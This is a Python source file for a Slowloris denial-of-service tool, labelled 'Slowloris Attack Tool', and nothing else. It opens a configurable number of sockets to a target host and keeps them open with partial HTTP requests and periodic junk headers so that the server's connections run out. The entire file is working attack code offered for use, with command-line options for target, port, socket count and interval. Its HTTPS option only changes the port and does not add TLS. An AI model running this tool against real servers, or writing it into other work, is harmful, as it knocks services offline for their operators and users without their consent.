import socket
import asyncio
import random
import argparse
import logging
from typing import List


logging.basicConfig(level=logging.INFO, format='%(asctime)s - %(levelname)s - %(message)s')

class Slowloris:
    def __init__(self, target: str, port: int, num_sockets: int, interval: int, https: bool):
        self.target = target
        self.port = port
        self.num_sockets = num_sockets
        self.interval = interval
        self.https = https
        self.sockets: List[socket.socket] = []

    async def init_socket(self) -> socket.socket:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.settimeout(4)
        await asyncio.get_event_loop().sock_connect(s, (self.target, self.port))
        s.send(f"GET /?{random.randint(0, 1000)} HTTP/1.1\r\n".encode("utf-8"))
        s.send("User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64)\r\n".encode("utf-8"))
        s.send("Accept-language: en-US,en,q=0.5\r\n".encode("utf-8"))
        logging.info(f"Socket to {self.target} initialized")
        return s

    async def create_sockets(self):
        logging.info(f"Creating {self.num_sockets} sockets...")
        for _ in range(self.num_sockets):
            try:
                s = await self.init_socket()
                self.sockets.append(s)
            except socket.error as e:
                logging.error(f"Socket creation failed: {e}")
                break

    async def send_keep_alive(self, s: socket.socket):
        try:
            s.send(f"X-a: {random.randint(1, 1000)}\r\n".encode("utf-8"))
            logging.debug("Sent keep-alive header")
        except socket.error:
            self.sockets.remove(s)
            s.close()
            logging.warning("Closed a socket and removed from list")

    async def run(self):
        await self.create_sockets()
        while self.sockets:
            logging.info("Sending keep-alive headers...")
            await asyncio.gather(*(self.send_keep_alive(s) for s in self.sockets))
            await asyncio.sleep(self.interval)
        logging.info("Attack finished")

if __name__ == "__main__":
    parser = argparse.ArgumentParser(description="Slowloris Attack Tool")
    parser.add_argument('target', help="Target URL or IP address")
    parser.add_argument('--port', type=int, default=80, help="Target port, default is 80")
    parser.add_argument('--sockets', type=int, default=200, help="Number of sockets to use, default is 200")
    parser.add_argument('--interval', type=int, default=15, help="Interval between keep-alive headers in seconds, default is 15")
    parser.add_argument('--https', action='store_true', help="Use HTTPS (default is HTTP)")
    
    args = parser.parse_args()
    
    target = args.target
    port = args.port if not args.https else 443
    num_sockets = args.sockets
    interval = args.interval
    https = args.https

    logging.info(f"Starting Slowloris attack on {target}:{port} with {num_sockets} sockets, interval {interval}s, HTTPS: {https}")

    slowloris = Slowloris(target, port, num_sockets, interval, https)
    asyncio.run(slowloris.run())
